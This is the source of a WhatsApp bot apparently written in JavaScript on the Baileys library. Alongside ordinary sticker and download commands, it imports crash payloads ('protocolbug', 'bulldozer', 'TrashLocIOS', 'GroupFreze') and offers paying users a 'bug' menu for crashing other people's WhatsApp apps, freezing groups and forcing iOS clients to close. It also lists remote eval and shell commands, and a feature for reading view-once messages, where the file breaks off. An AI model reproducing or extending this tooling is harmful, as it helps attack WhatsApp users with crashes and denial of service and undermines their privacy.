/*

€ Creator: Tama Ryuichi
€ Base: Tama Ryuichi
*Social Media*
 Github: https://github.com/Tama-Ryuichi
 Youtube: https://youtube.com/@tamainfinity
 Telegram: https://t.me/tamainfinity
 
<!> 
#Creator ( Tama Ryuichi )
©2024 - Tama

ini adalah base bot whatsapp simple buatanku jadi pakai aja kalau kamu tertarik.


#Developer ( Tama Ryuichi )
©2024 - Tama

This is my simple WhatsApp bot base, so feel free to use it if you're interested.

Don't Remove This Credits

*/
require('../settings/config')
const { 
  default: baileys, proto, jidNormalizedUser, generateWAMessage, 
  generateWAMessageFromContent, getContentType, prepareWAMessageMedia 
} = require("@whiskeysockets/baileys");

const {
  downloadContentFromMessage, emitGroupParticipantsUpdate, emitGroupUpdate, 
  generateWAMessageContent, makeInMemoryStore, MediaType, areJidsSameUser, 
  WAMessageStatus, downloadAndSaveMediaMessage, AuthenticationState, 
  GroupMetadata, initInMemoryKeyStore, MiscMessageGenerationOptions, 
  useSingleFileAuthState, BufferJSON, WAMessageProto, MessageOptions, 
  WAFlag, WANode, WAMetric, ChatModification, MessageTypeProto, 
  WALocationMessage, WAContextInfo, WAGroupMetadata, ProxyAgent, 
  waChatKey, MimetypeMap, MediaPathMap, WAContactMessage, 
  WAContactsArrayMessage, WAGroupInviteMessage, WATextMessage, 
  WAMessageContent, WAMessage, BaileysError, WA_MESSAGE_STATUS_TYPE, 
  MediariyuInfo, URL_REGEX, WAUrlInfo, WA_DEFAULT_EPHEMERAL, 
  WAMediaUpload, mentionedJid, processTime, Browser, MessageType, 
  Presence, WA_MESSAGE_STUB_TYPES, Mimetype, relayWAMessage, Browsers, 
  GroupSettingChange, DisriyuectReason, WASocket, getStream, WAProto, 
  isBaileys, AnyMessageContent, fetchLatestBaileysVersion, 
  templateMessage, InteractiveMessage, Header 
} = require("@whiskeysockets/baileys");

const fs = require('fs')
const util = require('util')
const chalk = require('chalk')
const os = require('os')
const axios = require('axios')
const fsx = require('fs-extra')
const crypto = require('crypto')
const ffmpeg = require('fluent-ffmpeg')
const sharp = require('sharp')
const jimp = require("jimp")
const { Client } = require('ssh2');
const moment = require('moment-timezone')
const { smsg, tanggal, getTime, isUrl, sleep, clockString, runtime, fetchJson, getBuffer, jsonformat, format, parseMention, getRandom, getGroupAdmins, generateProfilePicture } = require('../system/storage')
const { imageToWebp, videoToWebp, writeExifImg, writeExifVid, addExif } = require('../system/exif.js')
const { protocolbug1, protocolbug2, protocolbug3, protocolbug5, protocolbug6, bulldozer, protocolbug7 } = require('../system/Data3.js')
const { buttoncast, pendingpay, payoutzep, TrashLocIOS, invico2, letterCrash, StickerPack6, spack2, GroupFreze } = require('../system/Data4.js')
const babi = fs.readFileSync('./system/image/Hot.jpeg')

module.exports = client = async (client, m, chatUpdate, store) => {
const { from } = m
try {
      
const body = (
    // Pesan teks biasa
    m.mtype === "conversation" ? m.message.conversation :
    m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :

    // Pesan media dengan caption
    m.mtype === "imageMessage" ? m.message.imageMessage.caption :
    m.mtype === "videoMessage" ? m.message.videoMessage.caption :
    m.mtype === "documentMessage" ? m.message.documentMessage.caption || "" :
    m.mtype === "audioMessage" ? m.message.audioMessage.caption || "" :
    m.mtype === "stickerMessage" ? m.message.stickerMessage.caption || "" :

    // Pesan interaktif (tombol, list, dll.)
    m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
    m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
    m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :

    // Pesan khusus
    m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || 
    m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text :
    m.mtype === "reactionMessage" ? m.message.reactionMessage.text :
    m.mtype === "contactMessage" ? m.message.contactMessage.displayName :
    m.mtype === "contactsArrayMessage" ? m.message.contactsArrayMessage.contacts.map(c => c.displayName).join(", ") :
    m.mtype === "locationMessage" ? `${m.message.locationMessage.degreesLatitude}, ${m.message.locationMessage.degreesLongitude}` :
    m.mtype === "liveLocationMessage" ? `${m.message.liveLocationMessage.degreesLatitude}, ${m.message.liveLocationMessage.degreesLongitude}` :
    m.mtype === "pollCreationMessage" ? m.message.pollCreationMessage.name :
    m.mtype === "pollUpdateMessage" ? m.message.pollUpdateMessage.name :
    m.mtype === "groupInviteMessage" ? m.message.groupInviteMessage.groupJid :
    
    // Pesan satu kali lihat (View Once)
    m.mtype === "viewOnceMessage" ? (m.message.viewOnceMessage.message.imageMessage?.caption || 
                                     m.message.viewOnceMessage.message.videoMessage?.caption || 
                                     "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2" ? (m.message.viewOnceMessageV2.message.imageMessage?.caption || 
                                       m.message.viewOnceMessageV2.message.videoMessage?.caption || 
                                       "[Pesan sekali lihat]") :
    m.mtype === "viewOnceMessageV2Extension" ? (m.message.viewOnceMessageV2Extension.message.imageMessage?.caption || 
                                                m.message.viewOnceMessageV2Extension.message.videoMessage?.caption || 
                                                "[Pesan sekali lihat]") :

    // Pesan sementara (ephemeralMessage)
    m.mtype === "ephemeralMessage" ? (m.message.ephemeralMessage.message.conversation ||
                                      m.message.ephemeralMessage.message.extendedTextMessage?.text || 
                                      "[Pesan sementara]") :

    // Pesan interaktif lain
    m.mtype === "interactiveMessage" ? "[Pesan interaktif]" :

    // Pesan yang dihapus
    m.mtype === "protocolMessage" ? "[Pesan telah dihapus]" :

    ""
);
const budy = (typeof m.text == 'string' ? m.text: '')
const prefix = global.prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : global.prefa ?? global.prefix
const owner = JSON.parse(fs.readFileSync('./system/owner.json'))
const Premium = JSON.parse(fs.readFileSync('./system/premium.json'))
const isCmd = body.startsWith(prefix)
const command = body.startsWith(prefix) ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase(): ''
const args = body.trim().split(/ +/).slice(1)
const botNumber = await client.decodeJid(client.user.id)
const isCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const isDev = owner
  .map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net')
  .includes(m.sender)
const isPremium = [botNumber, ...Premium].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
const text = q = args.join(" ")
const quoted = m.quoted ? m.quoted : m
const from = mek.key.remoteJid
const { spawn: spawn, exec } = require('child_process')
const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
const groupMetadata = m.isGroup ? await client.groupMetadata(from).catch(e => {}) : ''
const participants = m.isGroup ? await groupMetadata.participants : ''
const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : ''
const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
const groupName = m.isGroup ? groupMetadata.subject : "";
const pushname = m.pushName || "No Name"
const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
const mime = (quoted.msg || quoted).mimetype || ''
const todayDateWIB = new Date().toLocaleDateString('id-ID', {
  timeZone: 'Asia/Jakarta',
  year: 'numeric',
  month: 'long',
  day: 'numeric',
});

if (!client.public) {
if (!isCreator) return
}

if (command) {
  if (m.isGroup) {
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - GROUP ⌟ ━━━━`));
    console.log(chalk.bgHex('#C51077').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Clock : ${time} \n` +
      ` 💬 Message Received : ${command} \n` +
      ` 🌐 Group Name : ${groupName} \n` +
      ` 🔑 Group Id : ${m.chat} \n` +
      ` 👤 Recipient : ${botNumber} \n`
    ));
  } else {
    console.log(chalk.bgBlue.white.bold(`━━━━ ⌜ SYSTEM - PRIVATE ⌟ ━━━━`));
    console.log(chalk.bgHex('#C51077').hex('#ffffff').bold(
      ` 📅 Date : ${todayDateWIB} \n` +
      ` 🕐 Clock : ${time} \n` +
      ` 💬 Message Received : ${command} \n` +
      ` 🗣️ Sender : ${pushname} \n` +
      ` 🌐 Group Name : No In Group \n` +
      ` 🔑 Group Id : No In Group \n` +
      ` 👤 Recipient : ${botNumber} \n`
    ));
  }
}
//=================================================//
// Function Main — Menu
//=================================================//
const CHANNELS_FILE = "./system/savesaluran.json";

function loadChannels() {
    if (fs.existsSync(CHANNELS_FILE)) {
        return JSON.parse(fs.readFileSync(CHANNELS_FILE, "utf-8"));
    }
    return [];
}

function saveChannels(data) {
    fs.writeFileSync(CHANNELS_FILE, JSON.stringify(data, null, 2));
}
global.channels = loadChannels();

function capital(string) {
  return string.charAt(0).toUpperCase() + string.slice(1);
}

async function tiktokDl(url) {
	return new Promise(async (resolve, reject) => {
		try {
			let data = []
			function formatNumber(integer) {
				let numb = parseInt(integer)
				return Number(numb).toLocaleString().replace(/,/g, '.')
			}
			
			function formatDate(n, locale = 'en') {
				let d = new Date(n)
				return d.toLocaleDateString(locale, {
					weekday: 'long',
					day: 'numeric',
					month: 'long',
					year: 'numeric',
					hour: 'numeric',
					minute: 'numeric',
					second: 'numeric'
				})
			}
			
			let domain = 'https://www.tikwm.com/api/';
			let res = await (await axios.post(domain, {}, {
				headers: {
					'Accept': 'application/json, text/javascript, */*; q=0.01',
					'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
					'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
					'Origin': 'https://www.tikwm.com',
					'Referer': 'https://www.tikwm.com/',
					'Sec-Ch-Ua': '"Not)A;Brand" ;v="24" , "Chromium" ;v="116"',
					'Sec-Ch-Ua-Mobile': '?1',
					'Sec-Ch-Ua-Platform': 'Android',
					'Sec-Fetch-Dest': 'empty',
					'Sec-Fetch-Mode': 'cors',
					'Sec-Fetch-Site': 'same-origin',
					'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
					'X-Requested-With': 'XMLHttpRequest'
				},
				params: {
					url: url,
					count: 12,
					cursor: 0,
					web: 1,
					hd: 1
				}
			})).data.data
			if (res?.duration == 0) {
				res.images.map(v => {
					data.push({ type: 'photo', url: v })
				})
			} else {
				data.push({
					type: 'watermark',
					url: 'https://www.tikwm.com' + res?.wmplay || "/undefined",
				}, {
					type: 'nowatermark',
					url: 'https://www.tikwm.com' + res?.play || "/undefined",
				}, {
					type: 'nowatermark_hd',
					url: 'https://www.tikwm.com' + res?.hdplay || "/undefined"
				})
			}
			let json = {
				status: true,
				title: res.title,
				taken_at: formatDate(res.create_time).replace('1970', ''),
				region: res.region,
				id: res.id,
				durations: res.duration,
				duration: res.duration + ' Seconds',
				cover: 'https://www.tikwm.com' + res.cover,
				size_wm: res.wm_size,
				size_nowm: res.size,
				size_nowm_hd: res.hd_size,
				data: data,
				music_info: {
					id: res.music_info.id,
					title: res.music_info.title,
					author: res.music_info.author,
					album: res.music_info.album ? res.music_info.album : null,
					url: 'https://www.tikwm.com' + res.music || res.music_info.play
				},
				stats: {
					views: formatNumber(res.play_count),
					likes: formatNumber(res.digg_count),
					comment: formatNumber(res.comment_count),
					share: formatNumber(res.share_count),
					download: formatNumber(res.download_count)
				},
				author: {
					id: res.author.id,
					fullname: res.author.unique_id,
					nickname: res.author.nickname,
					avatar: 'https://www.tikwm.com' + res.author.avatar
				}
			}
			resolve(json)
		} catch (e) {
			
		}
	});
}
const imageList = [
    "https://files.catbox.moe/gqqthi.jpg",
    "https://files.catbox.moe/m5urds.jpg",
    "https://files.catbox.moe/f72oxl.jpg"
];
const RandomMenu = imageList[Math.floor(Math.random() * imageList.length)];

function getRandomFile(ext) {
    return `${Math.floor(Math.random() * 10000)}${ext}`;
}
async function makeStickerFromUrl(imageUrl, client, m) {
    try {
        let buffer;
        if (imageUrl.startsWith("data:")) {
            const base64Data = imageUrl.split(",")[1];
            buffer = Buffer.from(base64Data, 'base64');
        } else {
            const response = await axios.get(imageUrl, { responseType: 'arraybuffer' });
            buffer = Buffer.from(response.data, "binary");
        }
        
        const webpBuffer = await sharp(buffer)
            .resize(512, 512, { fit: 'contain', background: { r: 255, g: 255, b: 255, alpha: 0 } })
            .webp({ quality: 70 })
            .toBuffer();
        
        const penis = await addExif(webpBuffer, global.packname, global.author)

        const fileName = getRandomFile(".webp");
        fs.writeFileSync(fileName, webpBuffer);

        await client.sendMessage(m.chat, {
            sticker: penis,
            contextInfo: {
                externalAdReply: {
                    showAdAttribution: true,
                    title: `𝐓𝐡𝐞 𝐙𝐨𝐫𝐨𝐂𝐱 🕊️`,
                    body: `િ፷𝑹̶𝒊̈́͟𝒛𝒙̶ᐁ𝑽𝒆̽͢𝒍𝒛𝑶̽𝒇𝒇𝒊𝒄𝒊𝒂𝒍፮▾ ༑̴⟆̊`,
                    mediaType: 3,
                    renderLargerThumbnail: false,
                    thumbnailUrl: RandomMenu, 
                    sourceUrl: `https://youtube.com/@RizxzWangsaff1205`
                }
            }
        }, { quoted: m });

        fs.unlinkSync(fileName);
    } catch (error) {
        console.error("Error creating sticker:", error);
        m.reply('Terjadi kesalahan saat membuat stiker. Coba lagi nanti.');
    }
}

const example = (teks) => {
return `Usage: ${prefix + command} ${teks}`
}

const ReplyButton = (teks) => {
const userMode = global.menuMode || 'nobutton'; // default button

if (userMode === 'nobutton') {

return client.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            externalAdReply: {
                showAdAttribution: true,
                title: `𝐓𝐡𝐞 𝐙𝐨𝐫𝐨𝐂𝐱 🕊️`,
                body: `િ፷𝑹̶𝒊̈́͟𝒛𝒙̶ᐁ𝑽𝒆̽͢𝒍𝒛𝑶̽𝒇𝒇𝒊𝒄𝒊𝒂𝒍፮▾ ༑̴⟆̊`,
                mediaType: 3,
                renderLargerThumbnail: false,
                thumbnailUrl: RandomMenu,
                sourceUrl: `https://whatsapp.com/channel/0029VafXmrW6buMLxerpel2W`
            }
        }
    }, { quoted: lol });
}
/*client.sendMessage(m.chat, {
  image: { url: RandomMenu },
  caption: teks,
  footer: "🩸 クラッシャー\nRizxVelz Official-ID",
  headerType: 4,
  hasMediaAttachment: true,
  contextInfo: {
    mentionedJid: [m.chat],
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast",
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363319314627296@newsletter",
      serverMessageId: 1,
      newsletterName: "🩸⃟༑⌁⃰𝐙͢𝐨𝐫𝐨 𝐄𝐱ͯ𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️"
    }
  }
}, { quoted: lol });
}*/

// BUTTON MODE
  const buttons = [
    {
      buttonId: '.menu',
      buttonText: {
        displayText: 'Menu'
      }
    }
  ];

  const buttonMessage = {
    image: { url: RandomMenu },
    caption: teks,
    footer: 'િ፷𝑹̶𝒊̈́͟𝒛𝒙̶ᐁ𝑽𝒆̽͢𝒍𝒛𝑶̽𝒇𝒇𝒊𝒄𝒊𝒂𝒍፮▾ ༑̴⟆',
    buttons: buttons,
    headerType: 6,
    contextInfo: { 
      forwardingScore: 99999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363319314627296@newsletter",
        serverMessageId: null,
        newsletterName: `🩸⃟༑⌁⃰𝐙͢𝐨𝐫𝐨 𝐄𝐱ͯ𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️`
      },
      mentionedJid: ['5521992999999@s.whatsapp.net'],
    },
    viewOnce: true
  };

  return client.sendMessage(m.chat, buttonMessage, { quoted: lol });
}

const ReplyButtonMenu = (teks) => {
const userMode = global.menuMode || 'nobutton'; // default button

if (userMode === 'nobutton') {

return client.sendMessage(m.chat, {
  image: { url: RandomMenu },
  caption: teks,
  footer: "🩸 クラッシャー\nRizxVelz Official-ID",
  headerType: 4,
  hasMediaAttachment: true,
  contextInfo: {
    mentionedJid: [m.chat],
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast",
    forwardingScore: 99999,
    isForwarded: true,
    forwardedNewsletterMessageInfo: {
      newsletterJid: "120363319314627296@newsletter",
      serverMessageId: 1,
      newsletterName: "🩸⃟༑⌁⃰𝐙͢𝐨𝐫𝐨 𝐄𝐱ͯ𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️"
    }
  }
}, { quoted: lol });
}

// BUTTON MODE
  const buttons = [
    {
      buttonId: '.xbug',
      buttonText: {
        displayText: 'Xbug'
    }
  },
  {
      buttonId: '.allmenu',
      buttonText: {
        displayText: 'Allmenu'
      }
    }
  ];

  const buttonMessage = {
    image: { url: RandomMenu },
    caption: teks,
    footer: 'િ፷𝑹̶𝒊̈́͟𝒛𝒙̶ᐁ𝑽𝒆̽͢𝒍𝒛𝑶̽𝒇𝒇𝒊𝒄𝒊𝒂𝒍፮▾ ༑̴⟆',
    buttons: buttons,
    headerType: 6,
    contextInfo: { 
      forwardingScore: 99999,
      isForwarded: true,
      forwardedNewsletterMessageInfo: {
        newsletterJid: "120363319314627296@newsletter",
        serverMessageId: null,
        newsletterName: `🩸⃟༑⌁⃰𝐙͢𝐨𝐫𝐨 𝐄𝐱ͯ𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠️`
      },
      mentionedJid: ['5521992999999@s.whatsapp.net'],
    },
    viewOnce: true
  };

  return client.sendMessage(m.chat, buttonMessage, { quoted: lol });
}

const lol = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    orderMessage: {
      orderId: "2009",
      thumbnail: babi,
      itemCount: "9999",
      status: "INQUIRY",
      surface: "",
      message: `—!s\`RizxVelz🫀\ncommand from: @${m.sender.split('@')[0]}`,
      token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
    }
  },
  contextInfo: {
    mentionedJid: ["120363369514105242@s.whatsapp.net"],
    forwardingScore: 999,
    isForwarded: true,
  }
}
const more = String.fromCharCode(8206)
const readmore = more.repeat(4001)
const namaOrang = m.pushName || "No Name";
const info = `${namaOrang}`;
//=================================================//
// Command Menu
//=================================================//
switch(command) {
case 'setmenu': {
  const selected = args[0]?.toLowerCase();
  if (!['button', 'nobutton'].includes(selected)) {
    return m.reply(`*Usage :*\n.setmenu button\n.setmenu nobutton`);
  }

  global.menuMode = selected; // Ubah global, bukan per user
  return m.reply(`✅ Tampilan menu semua user telah diubah ke *${selected.toUpperCase()}* mode.`);
}
/*case 'setmenu': {
  const selected = args[0]?.toLowerCase();
  if (!['button', 'nobutton'].includes(selected)) {
    return m.reply(`*Usage :*\n.setmenu button\n.setmenu nobutton`);
  }

  global.menuMode[m.sender] = selected;
  return m.reply(`✅ Tampilan menu berhasil diubah ke *${selected.toUpperCase()}* mode.`);
}*/

break
case 'start':
case 'help':
case 'menu': {
let Menu = `( 👋🏻 ) - Hello, ${info}!
I am an automated system (WhatsApp Bot) developed by RizxVelz Official-ID to assist you in various tasks directly through WhatsApp.

> Select the menu display .setmenu

── 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻
⭔ Developer : RizxVelzOfficial🫀
⭔ Mode : ${client.public ? "Public Bot" : "Private Bot"}
⭔ Status : ${isCreator ? "Owner User" : isPremium ? "Premium User" : "Not Acces"}

-# 𝗠𝗲𝗻𝘂
 ▢ .xbug
 ▢ .allmenu`
ReplyButtonMenu(Menu)
}
break
case 'allmenu':
case 'menuall': {
let Menu = `( 👋🏻 ) - Hello, ${info}!
I am an automated system (WhatsApp Bot) developed by RizxVelz Official-ID to assist you in various tasks directly through WhatsApp.

── 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻
⭔ Developer : RizxVelzOfficial🫀
⭔ Mode : ${client.public ? "Public Bot" : "Private Bot"}
⭔ Status : ${isCreator ? "Owner User" : isPremium ? "Premium User" : "Not Acces"}

-# 𝗢𝘄𝗻𝗲𝗿
 ▢ .addown
 ▢ .delown
 ▢ .listown
 ▢ .addprem
 ▢ .delprem
 ▢ .listprem
 ▢ .public
 ▢ .self
 ▢ .restart
 ▢ .hidetag
 ▢ .join
 ▢ .<
 ▢ .>
 ▢ .$
 
-# 𝗝𝗽𝗺
 ▢ .jpm
 ▢ .jpmht
 ▢ .jpmch
 ▢ .addidch
 ▢ .delidch

-# 𝗜𝗻𝘀𝘁𝗮𝗹𝗹
 ▢ .installpanel
 ▢ .uninstallpanel
 ▢ .hbpanel
 ▢ .startwings
 ▢ .installtemastellar
 ▢ .installtemabilling
 ▢ .installtemaenigma
 
-# 𝗗𝗶𝗴𝗶𝘁𝗮𝗹 𝗼𝗰𝗲𝗮𝗻
 ▢ .vps1g1c
 ▢ .vps2g1c
 ▢ .vps2g2c
 ▢ .vps4g2c
 ▢ .vps8g4c
 ▢ .vps16g4c
 ▢ .createvps
 ▢ .listdroplet
 ▢ .sisadroplet
 ▢ .restartvps
 ▢ .rebuild
 ▢ .deldroplet

-# 𝗣𝗮𝗻𝗲𝗹 𝗽𝘁𝗲𝗿𝗼𝗱𝗮𝗰𝘁𝘆𝗹
 ▢ .cadmin
 ▢ .listadmin
 ▢ .deladmin
 ▢ .listpanel
 ▢ .delpanel
 ▢ .1-10gb
 ▢ .unli
 
-# 𝗠𝗮𝗶𝗻
 ▢ .reactch
 ▢ .cekidch
 ▢ .sticker
 ▢ .tourl
 ▢ .brat
 ▢ .qc
 ▢ .rvo
 ▢ .tiktok`
ReplyButtonMenu(Menu)
}
break;
case 'menubug':
case 'xbug':
case 'bugmenu': {
let Menu = `( 👋🏻 ) - Hello, ${info}!
I am an automated system (WhatsApp Bot) developed by RizxVelz Official-ID to assist you in various tasks directly through WhatsApp.

── 𝗜𝗻𝗳𝗼𝗿𝗺𝗮𝘁𝗶𝗼𝗻
⭔ Developer : RizxVelzOfficial🫀
⭔ Mode : ${client.public ? "Public Bot" : "Private Bot"}
⭔ Status : ${isCreator ? "Owner User" : isPremium ? "Premium User" : "Not Acces"}

-# 𝗣𝗿𝗲𝗺𝗶𝘂𝗺
 ▢ .bulldozer
 ▢ .protocolbug1
 ▢ .protocolbug2
 ▢ .protocolbug3
 ▢ .protocolbug5
 ▢ .protocolbug6
 ▢ .protocolbug7
 
-# 𝗩𝘃𝗶𝗽
 ▢ .crashapp —( Bug Channel )
 ▢ .frezegrup —( Bug Group )
 ▢ .blank —( Bug Blank Chat )
 ▢ .crashios —( Bug ForceClose IoS )`
ReplyButtonMenu(Menu)
}

//=================================================//
// Command Owner
//=================================================//

break;

case 'addowner':
case 'addown': {
    if (!isCreator) return ReplyButton(mess.owner);
    
    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyButton(`Gunakan dengan:\n• Tag\n• Reply\n• Nomor\n\nContoh: ${prefix + command} 62xxx`);
    }

    let checkNumber = await client.onWhatsApp(number + "@s.whatsapp.net");
    if (!checkNumber.length) return ReplyButton("Nomor tidak valid di WhatsApp!");

    if (!owner.includes(number)) owner.push(number);
    if (!Premium.includes(number)) Premium.push(number);

    fs.writeFileSync('./system/owner.json', JSON.stringify(owner));
    fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));
    ReplyButton(`✅ Berhasil menambahkan *@${number}* sebagai Owner`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
}
break;

case 'delowner':
case 'delown': {
    if (!isCreator) return ReplyButton(mess.owner);

    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyButton(`Gunakan dengan:\n• Tag\n• Reply\n• Nomor\n\nContoh: ${prefix + command} 62xxx`);
    }

    owner.splice(owner.indexOf(number), 1);
    Premium.splice(Premium.indexOf(number), 1);

    fs.writeFileSync('./system/owner.json', JSON.stringify(owner));
    fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));
    ReplyButton(`❌ Owner *@${number}* berhasil dihapus.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
}
break;

case 'addpremium':
case 'addprem': {
    if (!isCreator) return ReplyButton(mess.owner);

    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyButton(`Gunakan dengan:\n• Tag\n• Reply\n• Nomor\n\nContoh: ${prefix + command} 62xxx`);
    }

    let ceknum = await client.onWhatsApp(number + "@s.whatsapp.net");
    if (!ceknum.length) return ReplyButton("Nomor tidak valid!");

    if (!Premium.includes(number)) Premium.push(number);
    fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));

    ReplyButton(`✅ *@${number}* berhasil jadi user premium.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
}
break;

case 'delpremium':
case 'delprem': {
    if (!isCreator) return ReplyButton(mess.owner);

    let number;
    if (m.quoted) {
        number = m.quoted.sender.split('@')[0];
    } else if (m.mentionedJid?.length) {
        number = m.mentionedJid[0].split('@')[0];
    } else if (args[0]) {
        number = args[0].replace(/[^0-9]/g, '');
    } else {
        return ReplyButton(`Gunakan dengan:\n• Tag\n• Reply\n• Nomor\n\nContoh: ${prefix + command} 62xxx`);
    }

    let index = Premium.indexOf(number);
    if (index !== -1) {
        Premium.splice(index, 1);
        fs.writeFileSync('./system/premium.json', JSON.stringify(Premium));
        ReplyButton(`❌ *@${number}* telah dihapus dari daftar premium.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
    } else {
        ReplyButton(`⚠️ *@${number}* tidak terdaftar sebagai premium.`, m.chat, { mentions: [number + '@s.whatsapp.net'] });
    }
}
break;
case 'listpremium':
case 'listprem': {
    if (!isCreator) return ReplyButton(mess.owner);

    if (Premium.length === 0) return ReplyButton("❌ Tidak ada user premium.");
    
    let textList = `*📜 Daftar User Premium:*\n\n`;
    for (let i = 0; i < Premium.length; i++) {
        textList += `${i + 1}. wa.me/${Premium[i]}\n`;
    }

    return ReplyButton(textList);
}
break;
case 'listowner':
case 'listown': {
    if (!isCreator) return ReplyButton(mess.owner);

    if (owner.length === 0) return ReplyButton("❌ Tidak ada data Owner.");

    let textList = `*👑 Daftar Owner Bot:*\n\n`;
    for (let i = 0; i < owner.length; i++) {
        textList += `${i + 1}. wa.me/${owner[i]}\n`;
    }

    return ReplyButton(textList);
}
break;
case 'public': {
    if (!isCreator) return ReplyButton(mess.owner);
    client.public = true;
    ReplyButton("Bot set to public mode.");
}
break;

case 'private': case 'self': {
    if (!isCreator) return ReplyButton(mess.owner);
    client.public = false;
    ReplyButton("Bot set to private mode.");
}
break
case "restart": {
    if (!isCreator) return ReplyButton(mess.owner);

    ReplyButton("Restarting Bot.....");

    // Delay 3 detik lalu keluar
    setTimeout(() => {
        process.exit(1);
    }, 3000);
}
//=================================================//
// Command Main
//=================================================//
break

case "cekidch": case "idch": {
if (!text) return ReplyButton(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return ReplyButton("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await client.newsletterMetadata("invite", result)
let teks = `${res.id}
`
return ReplyButton(teks)
}
break
case "reactch": {
 if (!text || !args[0] || !args[1]) 
 return ReplyButton(example("linkch 😐"));
 if (!args[0].includes("https://whatsapp.com/channel/")) 
 return ReplyButton("Link tautan tidak valid")
 let result = args[0].split('/')[4]
 let serverId = args[0].split('/')[5]
 let res = await client.newsletterMetadata("invite", result) 
 await client.newsletterReactMessage(res.id, serverId, args[1])
 ReplyButton(`Berhasil mengirim reaction ${args[1]} ke dalam channel ${res.name}`)
}
break;
case 'brat': {
            if (!q) return ReplyButton(`Send command with text. ${prefix + command} Rizxvelz`)
            const imageUrl = `https://brat.caliphdev.com/api/brat?text=${q}`
            await makeStickerFromUrl(imageUrl, client, m);
        }
break;

case 'qc': {
  if (!q) return ReplyButton(example('teksnya'))
  let obj = {
    type: 'quote',
    format: 'png',
    backgroundColor: '#ffffff',
    width: 512,
    height: 768,
    scale: 2,
    messages: [
      {
        entities: [],
        avatar: true,
        from: {
          id: 1,
          name: `${pushname}`,
          photo: { 
            url: await client.profilePictureUrl(m.sender, "image").catch(() => 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60'),
          }
        },
        text: `${q}`,
        replyMessage: {},
      },
    ],
  };
  let response = await axios.post('https://bot.lyo.su/quote/generate', obj, {
    headers: {
      'Content-Type': 'application/json',
    },
  });
  let buffer = Buffer.from(response.data.result.image, 'base64');
  client.sendImageAsSticker(m.chat, buffer, m, { packname: `${global.packname}`, author: `${global.author}` });
}
break;

case "rvo":
case "readvo":
case 'readviewonce':
case 'readviewoncemessage': {
